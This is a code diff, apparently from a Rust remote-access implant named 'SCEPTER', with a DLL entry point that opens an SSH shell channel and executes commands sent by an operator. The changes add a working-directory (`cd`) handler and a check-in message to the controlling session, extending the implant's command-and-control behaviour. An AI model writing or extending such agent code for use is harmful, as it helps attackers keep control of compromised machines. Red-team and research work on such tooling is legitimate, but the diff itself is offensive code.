@@ -98,6 +98,25 @@ pub fn run_command(command: &str) -> Result<String, io::Error> {
     let program = parts[0];
     let args = &parts[1..];
 
+    // Check if program is cd. Needs this work around so we'll actually cd
+    if cmd.starts_with("cd") {
+        if args.is_empty() {
+            return Err(std::io::Error::new(
+                io::ErrorKind::InvalidInput,
+                format!("No directory specified for cd command: {}\nTry putting the command in quotes \"cd C:\\\"", command),
+            ));
+        }
+        let result = std::env::set_current_dir(&args[0]);
+        return match result {
+            Ok(_) => {
+                Ok("Success.".to_string())
+            },
+            Err(e) => {
+                Err(e)
+            }
+        };
+    };
+
     // Create and execute the cmd, capturing output
     let output = Command::new(program).args(args).output()?;
 
@@ -167,6 +186,17 @@ pub async fn dll_main() {
                                 // Request a shell - this is crucial for receiving ongoing data
                                 match channel.request_shell(true).await {
                                     Ok(_) => {
+                                        let checkin_message = "[SCEPTER] Agent Checkin.";
+                                        session
+                                            .data(
+                                                channel.id(),
+                                                CryptoVec::from(
+                                                    checkin_message.as_bytes(),
+                                                ),
+                                            )
+                                            .await
+                                            .unwrap();
+
                                         debug_println!(
                                             "Shell session established, waiting for messages..."
                                         );
